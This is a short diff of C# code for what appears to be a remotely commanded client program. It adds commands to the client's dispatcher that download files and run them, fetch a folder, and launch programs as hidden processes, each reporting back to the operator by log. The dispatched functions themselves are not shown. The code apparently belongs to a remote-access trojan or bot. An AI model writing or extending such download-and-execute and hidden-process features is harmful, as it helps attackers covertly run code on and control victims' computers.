@@ -40,9 +40,23 @@ namespace ClientWorker
                 case "DownloadAndRun":
                     foreach (string prm in parametrs)
                     {
-                       FileManager.GetFileAndRun(prm);
+                       FileManager.DownloadFileAndRun(prm);
                     }
                     Log.Send("DownloadAndRun()");
+                    break;
+
+                case "DownloadFloader":
+                    //=====================================================>> Исправить
+                    FileManager.DownloadFloader(parametrs[0], parametrs[1]);
+                    Log.Send("DownloadFloader()");
+                    break;
+
+                case "RunProgram":
+                    foreach (string prm in parametrs)
+                    {
+                        FileManager.RunHideProc(prm);
+                    }
+                    Log.Send("RunProgram()");
                     break;
 
                 case "GetSettings":
